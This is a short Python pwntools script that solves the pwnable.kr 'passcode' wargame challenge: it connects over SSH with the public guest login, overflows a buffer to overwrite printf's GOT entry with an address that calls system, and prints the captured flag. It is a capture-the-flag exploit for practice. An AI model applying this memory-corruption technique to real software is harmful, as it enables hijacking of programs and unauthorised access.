from pwn import *

REMOTE_ADDRESS = "pwnable.kr"
REMOTE_PORT = 2222
REMOTE_USERNAME = "passcode"
REMOTE_PASSWORD = "guest"

shell = ssh(host = REMOTE_ADDRESS, port = REMOTE_PORT, user = REMOTE_USERNAME, password = REMOTE_PASSWORD)
process = shell.process([b'./passcode'])

shellcode = b'a' * 0x60 + p32(0x0804a000)

# 0804a000 is printf@GLIBC_2.0
process.sendline(shellcode)

# 134514147 hex is 0x80485ea, this address is "call   8048460 <system@plt>"
process.sendline(b"134514147")
process.recvuntil(b'passcode1 : ')

flag = (process.recvline()).decode().strip()

print(f"Flag is: {flag}")